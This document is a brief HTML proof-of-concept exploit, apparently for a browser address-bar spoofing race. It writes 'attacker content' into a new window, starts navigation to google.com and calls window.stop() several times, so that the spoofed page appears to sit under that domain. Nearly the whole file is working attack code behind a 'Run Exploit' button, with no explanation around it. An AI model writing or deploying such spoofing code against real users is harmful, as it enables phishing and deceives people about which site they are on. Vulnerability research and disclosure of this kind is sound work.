<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC - Navigation Stop Race</title>
</head>
<body>

<h2>Navigation Stop Race</h2>
<button onclick="run()">Run Exploit</button>

<script>
const TARGET = "https://www.google.com";

const PAYLOAD = `
<h1>ADDRESS BAR SPOOFED</h1>
<p>This is attacker content</p>
`;

function run() {
  const w = window.open("about:blank");

  setTimeout(() => {
    w.document.write(PAYLOAD);

    // trigger navigation
    w.location.href = TARGET;

    // stop race
    setTimeout(() => w.stop(), 1);
    setTimeout(() => w.stop(), 5);
    setTimeout(() => w.stop(), 10);
  }, 100);
}
</script>

</body>
</html>
